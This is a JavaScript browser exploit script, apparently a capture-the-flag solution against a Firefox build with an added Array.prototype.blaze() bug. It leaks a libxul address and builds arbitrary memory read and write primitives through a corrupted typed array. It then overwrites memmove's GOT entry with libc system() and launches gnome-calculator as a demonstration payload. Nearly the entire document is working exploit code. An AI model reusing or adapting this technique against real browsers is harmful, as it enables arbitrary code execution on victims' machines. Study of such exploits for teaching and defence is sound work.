var jsp = new JSPack();

function lower(d) {
    return jsp.Unpack(">L>L", jsp.Pack("d", [d]))[1];
}

function upper(d) {
    return jsp.Unpack(">L>L", jsp.Pack("d", [d]))[0];
}

function double_to_ulong(d) {
    return upper(d)*0x100000000 + lower(d);
}

function ulong_to_double(n) {
    l = jsp.Pack(">L", [n%0x100000000]);
    u = jsp.Pack(">L", [n/0x100000000]);
    return jsp.Unpack("d", u.concat(l))[0];
}

var leak_arr = new Array(2);

// Markers to help us find array
leak_arr[0] = 0x41424241;
leak_arr[1] = 0x42434342;

leak_arr.blaze();

alert("Leaking libxul");
var libxul_leak = double_to_ulong(leak_arr[5]);

alert(libxul_leak.toString(16));

var arr = new Array(2);
var typed_arr = new Uint32Array(0x10);

arr[0] = 0x43444443;
arr[1] = 0x44454544;
typed_arr[0] = 0x45464645;
typed_arr[1] = 0x46474746;

arr.blaze();

function a_write(addr, value) {
    arr[9] = ulong_to_double(addr);
    typed_arr[0] = value % 0x100000000;
    typed_arr[1] = value / 0x100000000;
}

function a_read(addr) {
    arr[9] = ulong_to_double(addr);
    return typed_arr[0] + typed_arr[1]*0x100000000;
}

var libxul_base = libxul_leak - 0x7f8ab37a9fc0 + 0x7f8aac2d8000;
var memmove_got = libxul_base + 0x88d24b0;

var memmove_addr = a_read(memmove_got);

alert("Memmove addr: " + memmove_addr.toString(16));

var libc_base = memmove_addr - 0x14d9b0;
var system_addr = libc_base + 0x45390;

var cmd = "/usr/bin/gnome-calculator &";
var target = new Uint8Array(200);

for (var i = 0;i<cmd.length;i++) {
    target[i] = cmd.charCodeAt(i);
}
target[cmd.length] = 0;

alert("Triggering exploit");

a_write(memmove_got, system_addr);
target.copyWithin(0, 1);
a_write(memmove_got, memmove_addr);

alert("pause");
